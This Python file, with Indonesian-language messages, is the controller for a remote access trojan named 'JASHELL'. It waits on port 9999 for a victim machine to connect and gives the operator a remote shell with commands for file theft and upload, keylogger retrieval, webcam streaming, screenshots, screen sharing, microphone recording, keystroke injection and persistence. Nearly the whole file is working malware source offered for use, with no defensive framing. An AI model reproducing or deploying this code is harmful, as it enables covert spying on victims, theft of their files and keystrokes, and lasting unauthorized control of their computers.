import socket
import json
import os
import struct
import pickle
import cv2
import threading
import wave
import pyaudio
import pyfiglet
import random
from colorama import Fore
from vidstream import StreamingServer

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('0.0.0.0', 9999))
print(Fore.GREEN+'[+] Menunggu koneksi...')
soc.listen(1)

koneksi = soc.accept()
_target = koneksi[0]
ip = koneksi[1]
print(_target)
print(Fore.CYAN+f'[+] Terhubung ke {str(ip)}')

def keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.bind(('0.0.0.0', 9995))
          s.listen(1)
          print(Fore.GREEN+'Connect')
          conn, addr= s.accept()
          with conn:
               print(Fore.CYAN+f'connected {addr}')
               while True:
                    command = input('text: ')
                    conn.sendall(command.encode())
                    break
     print(Fore.GREEN+'send')

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024

def receive_and_save():
     frames = []
     try:
          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
               s.bind(('0.0.0.0', 9996))
               s.listen(1)
               conn, addr = s.accept()
               with conn:
                    print(Fore.GREEN+'connect')
                    while True:
                         data = conn.recv(CHUNK)
                         if not data:
                              break
                         frames.append(data)
          print(Fore.CYAN+'saving WAV file')
          WAVE_OUTPUT = 'retrieved_audio.wav'
          with wave.open(WAVE_OUTPUT, 'wb') as wf:
               wf.setnchannels(CHANNELS)
               wf.setsampwidth(2)
               wf.setframerate(RATE)
               wf.writeframes(b''.join(frames))
          print(f'{WAVE_OUTPUT}')
     except socket.error as e:
          print(e)
     
def konversi_byte_screen_recorder():
     receive = StreamingServer('0.0.0.0', 9997)

     t = threading.Thread(target=receive.start_server)
     t.start()

     while input("") != 'stop':
          continue
     receive.stop_server()

def konversi_byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(('0.0.0.0', 9998))
     sock.listen(1)
     konek = sock.accept()
     tg = konek[0]
     ip = konek[1]
     print(f'connected {ip}')
     bdata = b""
     payload_size = struct.calcsize("Q")
     while True:
          while(len(bdata)) < payload_size:
               packet = tg.recv(4*1024)
               if not packet: break
               bdata += packet

          packed_msg_size = bdata[:payload_size]
          bdata = bdata[payload_size:]
          msg_size = struct.unpack("Q", packed_msg_size)[0]
          while len(bdata) < msg_size:
               bdata += tg.recv(4*1024)
          frame_data = bdata[:msg_size]
          bdata =  bdata[msg_size:]
          frame = pickle.loads(frame_data)
          cv2.imshow("streaming", frame)
          key = cv2.waitKey(1)
          if key == 27:
               break
     tg.close()
     cv2.destroyAllWindows()

def stream_cam():
     t = threading.Thread(target=konversi_byte_stream)
     t.start()

def upload_file(namafile):
     file = open(namafile, 'rb')
     _target.send(file.read())
     file.close()

def download_file(namafile):
     file = open(namafile, 'wb')
     _target.settimeout(1)
     _file = _target.recv(100000)
     while _file:
          print(Fore.GREEN+'downloading')
          file.write(_file)
          try:
               file = _target.recv(100000)
          except socket.timeout as e:
               print(Fore.CYAN+'downloaded')
               break

     _target.settimeout(None)
     file.close()

def data_diterima():
        data = ''
        while True:
            try:
                data = data + _target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                 continue

def shellc():
    n = 0
    print(Fore.BLUE+"Type 'help' for help")
    while True:
        perintah = input(Fore.GREEN+'jashell~# ')
        data = json.dumps(perintah)
        _target.send(data.encode())
        if perintah in('exit','quit'):
             break
        elif perintah == 'clear':
             os.system('clear')
        elif perintah[:3] == 'cd ':
             pass
        elif perintah[:8] == 'download':
             download_file(perintah[9:])
        elif perintah[:6] == 'upload':
             upload_file(perintah[7:])
        elif perintah == 'start_log':
             pass
        elif perintah == 'baca_log':
             data = _target.recv(1024).decode()
             print(data)
        elif perintah == 'stop_log':
             pass
        elif perintah == 'start_cam':
             stream_cam()
        elif perintah ==  'screensh':
             n += 1
             file = open("ss"+str(n)+".png", 'wb')
             _target.settimeout(3)
             _file = _target.recv(1024)
             while _file:
                  file.write(_file)
                  try:
                       _file = _target.recv(1024)
                  except socket.timeout as e:
                       break
             _target.settimeout(None)
             file.close()
        elif perintah == 'screensr':
             konversi_byte_screen_recorder()
        elif perintah == 'help':
             print(Fore.BLUE+"""
                   -exit/quit >> keluar
                   
                   -clear     >> bersihkan terminal

                   -download  >> mendownload file

                   -upload    >> mengupload file

                   -start_log >> memulai keylogger

                   -baca_log  >> membaca hasil keylogger

                   -stop_log  >> menghentikan keylogger

                   -start_cam >> mengakses kamera

                   -screensh  >> screenshot layar

                   -screensr  >> berbagi layar

                   -persistence >> menjalankan persistensi
                   contoh:    peristence winsec manager.exe
                   
                   -rec_audio >> merekam audio
                   
                   -send      >> mengirimkan keyboard

                   -banner    >> baner
                   
                   """)
        elif perintah == 'rec_audio':
             receive_and_save()
        elif perintah == 'banner':
             list_banner = [pyfiglet.figlet_format('JASHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('JASHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
             choice = random.choice(list_banner)
             print(choice)
        elif perintah == 'send':
             keystroke()  
        else:
             hasil = data_diterima()
             print(hasil)

shellc()
